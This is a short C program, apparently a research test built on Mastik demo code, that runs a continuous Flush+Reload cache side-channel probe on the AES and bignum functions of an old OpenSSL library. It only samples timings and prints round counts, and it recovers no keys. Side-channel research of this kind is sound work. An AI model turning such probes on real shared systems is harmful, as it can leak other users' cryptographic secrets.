/*
 * Simple Flush+Reload test against OpenSSL AES
 * Based on Mastik demo code
 * Runs continuously until Ctrl+C
 */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <dlfcn.h>
#include <mastik/fr.h>
#include <mastik/util.h>

#define SAMPLES 10000
#define SLOT    2000
#define THRESHOLD 150

// OpenSSL AES function offsets (from nm output)
#define AES_ENCRYPT_OFFSET 0x7f7d0
#define AES_DECRYPT_OFFSET 0x7fb90
#define BN_MUL_OFFSET      0x9e1b0

static volatile int running = 1;

void sigint_handler(int sig) {
    running = 0;
    printf("\nStopping...\n");
}

int main(int ac, char **av) {
    char *libpath = "/home/x/first_collect/attack/openssl-1.0.1f/libcrypto.so.1.0.0";

    if (ac > 1)
        libpath = av[1];

    signal(SIGINT, sigint_handler);

    printf("Flush+Reload Attack (Continuous Mode)\n");
    printf("Target: %s\n", libpath);
    printf("Threshold: %d cycles\n", THRESHOLD);
    printf("Press Ctrl+C to stop\n\n");

    // Map the library
    void *aes_encrypt = map_offset(libpath, AES_ENCRYPT_OFFSET);
    void *aes_decrypt = map_offset(libpath, AES_DECRYPT_OFFSET);
    void *bn_mul = map_offset(libpath, BN_MUL_OFFSET);

    if (!aes_encrypt || !aes_decrypt || !bn_mul) {
        fprintf(stderr, "Failed to map addresses\n");
        return 1;
    }

    printf("Mapped: AES_encrypt=%p, AES_decrypt=%p, bn_mul=%p\n\n",
           aes_encrypt, aes_decrypt, bn_mul);

    // Setup Flush+Reload
    fr_t fr = fr_prepare();
    fr_monitor(fr, aes_encrypt);
    fr_monitor(fr, aes_decrypt);
    fr_monitor(fr, bn_mul);

    int nmonitor = 3;
    uint16_t *res = malloc(SAMPLES * nmonitor * sizeof(uint16_t));

    // Touch pages
    for (int i = 0; i < SAMPLES * nmonitor; i += 4096/sizeof(uint16_t))
        res[i] = 1;

    uint64_t round = 0;
    while (running) {
        fr_probe(fr, res);
        int l = fr_trace(fr, SAMPLES, res, SLOT, THRESHOLD, 500);
        round++;

        if (round % 100 == 0) {
            printf("\r[Round %lu] Samples: %d    ", round, l);
            fflush(stdout);
        }
    }

    printf("\nTotal rounds: %lu\n", round);

    free(res);
    fr_release(fr);

    return 0;
}
